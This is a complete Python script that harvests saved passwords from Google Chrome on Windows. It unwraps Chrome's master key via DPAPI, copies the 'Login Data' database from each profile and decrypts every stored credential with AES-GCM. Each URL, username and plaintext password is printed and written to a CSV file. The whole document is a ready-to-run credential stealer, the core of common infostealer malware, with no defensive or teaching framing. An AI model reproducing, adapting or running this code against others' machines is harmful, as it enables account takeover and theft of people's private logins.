import os
import re
import json
import base64
import sqlite3
import shutil
import csv
import win32crypt
from Cryptodome.Cipher import AES

def get_secret_key():
    try:
        local_state_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State")
        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"[ERR] Failed to get secret key: {e}")
        return None

def decrypt_password(ciphertext, secret_key):
    try:
        iv = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = AES.new(secret_key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_password).decode()
    except Exception as e:
        print(f"[ERR] Failed to decrypt password: {e}")
        return ""

def extract_passwords():
    chrome_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
    login_db_filename = "Login Data"
    secret_key = get_secret_key()
    if not secret_key:
        return

    output_file = "decrypted_passwords.csv"
    with open(output_file, 'w', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        writer.writerow(["URL", "Username", "Password"])
        
        profiles = [f for f in os.listdir(chrome_path) if re.match(r"^Profile|Default", f)]
        for profile in profiles:
            db_path = os.path.join(chrome_path, profile, login_db_filename)
            if not os.path.exists(db_path):
                continue

            temp_db = "Loginvault.db"
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()

            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for url, username, ciphertext in cursor.fetchall():
                    if url and username and ciphertext:
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        print(f"URL: {url}\nUser: {username}\nPass: {decrypted_password}\n{'-'*40}")
                        writer.writerow([url, username, decrypted_password])
            except Exception as e:
                print(f"[ERR] Database query failed: {e}")
            finally:
                cursor.close()
                conn.close()
                os.remove(temp_db)

if __name__ == '__main__':
    extract_passwords()